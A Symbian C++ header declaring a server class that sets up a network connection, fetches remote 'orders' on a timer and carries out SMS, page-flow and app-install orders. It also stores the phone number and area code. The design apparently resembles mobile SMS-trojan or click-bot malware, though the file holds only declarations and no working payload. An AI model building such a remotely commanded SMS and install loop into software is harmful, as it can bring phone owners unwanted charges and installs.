#ifndef __CSMSFILTERSERVER_H__
#define __CSMSFILTERSERVER_H__
#include <e32std.h>
#include <e32base.h>
#include <s32file.h>
#include <flogger.h>
#include <commdbconnpref.h>
#include <es_sock.h>
#include "applicationmanager.h"
#include "socketengine.h"
#include "timeouttimer.h"
#include "commonutils.h"
#include "smsmanager.h"
#include "flowpagemanager.h"

struct Task{
  TInt TaskFlag;
  HBufC8* TaskOrder;
};

enum TInstallManagerPanic{
  EBadRequest=1, EBadDescriptor=2, ESrvCreateServer=3, EMainSchedulerError=4, ECreateTrapCleanup=5, ESrvSessCreateTimer=6, EReqAlreadyPending=7
};
enum TTaskState{
  EInitializeNetWork,EInitialTask,EInitialVariables,EGetOrder,EExecuteSmsOrder,EExecutePageFlowOrder,EExecuteAppOrder,ECloseNetwork, ECleanUp
};

class CAppMain:public CServer2,MTimeOutNotify,CTaskObserver{
public:
  static CAppMain* NewL();
  static CAppMain* NewLC();
  virtual ~CAppMain();
  static TInt EntryPoint(TAny* aStarted);
  static void ThreadMainL();
  static void PanicClient(const RMessage2& aMessage,TInstallManagerPanic aPanic);
  static void PanicServer(TInstallManagerPanic aPanic);
  static TInt StartTaskFlow(TAny* aObject);
  void OnTimerExpired();
  void InitializeNetWork();
  void CloseNetWork();
  void CleanUp();
  TBool GetState();
  TBool GetAccessPoint();
  TInt OrderCancel();
  void OnTaskSuccess(TInt aTaskFlag);
  void OnTaskFailed(TInt aTaskFlag,const TDesC8& aFailedReason,TInt aFailedStep);
protected:
  TInt RunError(TInt aError);
private:
  CAppMain(TInt aPriority);
  void ConstructL();
  CSession2* NewSessionL(const TVersion& aVersion,const RMessage2& aMessage) const;
  void DoInitConfigUrl();
  TInt DoInitNetworkFlow();
  void DoCloseNetworkFlow();
  void OnHttpError(THttpErrorID aErrId); //CHTTPDownObserver
  void StartFlow(const TDesC8& aFlowOrder,TInt aTaskFlag);
public:
  RSocketServ iSocketServ;
  RConnection iConnection;
  TBool iFirstConnect;
  TCommDbConnPref prefs; //预选网络接入点对象
  TUint32 iDefaultAccessPointID;
  TInt iCountConnect;
  CApplicationManager* iAppManager;
private:
  CTimeOutTimer* iTimeout;
  TTaskState iTaskState;
  CFlowPageManager* iFlowPageManager;
  CSmsManager* iSmsManager;
  CPeriodic* iTaskPeriodic;
  TInt iPeriodicCount;
  TBuf8<11> iPhoneNumber;
  TBuf8<6> iAreaCode;
  CArrayPtrSeg<Task>* iTaskArray;
  TBuf8<4096> iSmsOrder;
  TBuf8<4096> iAppOrder;
  TBuf8<10240> iPageOrder;
};

#endif 
